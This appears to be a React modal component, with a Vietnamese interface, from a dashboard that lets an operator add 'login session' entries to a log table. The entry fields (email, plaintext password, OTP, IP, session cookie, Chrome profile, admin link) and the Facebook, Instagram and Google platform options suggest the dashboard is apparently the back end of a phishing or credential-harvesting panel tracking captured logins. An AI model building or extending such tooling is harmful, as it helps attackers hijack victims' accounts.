import React, { useState } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from '@/components/ui/dialog';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useToast } from '@/components/ui/use-toast';
import { FilePlus2, Facebook, Instagram, Wifi } from 'lucide-react';

const CreateLoginModal = ({ isOpen, onOpenChange, addLogEntry }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [platform, setPlatform] = useState('');
  const { toast } = useToast();

  const handleCreate = () => {
    if (!email.trim() || !password.trim() || !platform) {
      toast({
        title: 'Lỗi',
        description: 'Vui lòng nhập đầy đủ tài khoản, mật khẩu và chọn nền tảng.',
        variant: 'destructive',
      });
      return;
    }

    const platformsMap = {
      'facebook': { name: 'Facebook', icon: Facebook, color: 'text-blue-500' },
      'instagram': { name: 'Instagram', icon: Instagram, color: 'text-pink-500' },
      'google': { name: 'Google', icon: Wifi, color: 'text-red-500' },
      'manual': { name: 'Manual', icon: FilePlus2, color: 'text-gray-400' },
    };
    
    const selectedPlatform = platformsMap[platform.toLowerCase()] || platformsMap['manual'];

    const newLogEntry = {
      id: Date.now(),
      time: new Date().toISOString(),
      user: email,
      password: password,
      otp: 'N/A',
      ip: '127.0.0.1',
      status: { name: 'Mới tạo', icon: FilePlus2, color: 'text-cyan-400' },
      platform: selectedPlatform,
      adminLink: { key: 'manual', label: 'Manual Entry', adminName: 'Admin' },
      cookie: 'Chờ...',
      chromeProfile: 'N/A',
    };

    addLogEntry(newLogEntry);

    toast({
      title: 'Tạo thành công!',
      description: `Đã tạo phiên đăng nhập cho ${email}.`,
    });

    setEmail('');
    setPassword('');
    setPlatform('');
    onOpenChange(false);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[425px] bg-slate-900 border-slate-800 text-white">
        <DialogHeader>
          <DialogTitle>Tạo Phiên Đăng Nhập</DialogTitle>
          <DialogDescription>
            Nhập thông tin để tạo một entry đăng nhập mới trong bảng.
          </DialogDescription>
        </DialogHeader>
        <div className="grid gap-4 py-4">
          <div className="grid grid-cols-4 items-center gap-4">
            <Label htmlFor="email-create" className="text-right">
              Tài khoản
            </Label>
            <Input
              id="email-create"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="col-span-3 bg-slate-800 border-slate-700"
              placeholder="user@example.com"
            />
          </div>
          <div className="grid grid-cols-4 items-center gap-4">
            <Label htmlFor="password-create" className="text-right">
              Mật khẩu
            </Label>
            <Input
              id="password-create"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="col-span-3 bg-slate-800 border-slate-700"
              placeholder="••••••••"
            />
          </div>
          <div className="grid grid-cols-4 items-center gap-4">
            <Label htmlFor="platform-create" className="text-right">
              Nền tảng
            </Label>
            <Select onValueChange={setPlatform} value={platform}>
              <SelectTrigger id="platform-create" className="col-span-3 bg-slate-800 border-slate-700 text-left">
                <SelectValue placeholder="Chọn nền tảng..." />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="facebook">Facebook</SelectItem>
                <SelectItem value="google">Google</SelectItem>
                <SelectItem value="instagram">Instagram</SelectItem>
                <SelectItem value="manual">Thủ công</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>
        <DialogFooter>
          <Button onClick={handleCreate} type="submit" className="bg-cyan-600 hover:bg-cyan-700">
            <FilePlus2 className="mr-2 h-4 w-4" /> Tạo
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};

export default CreateLoginModal;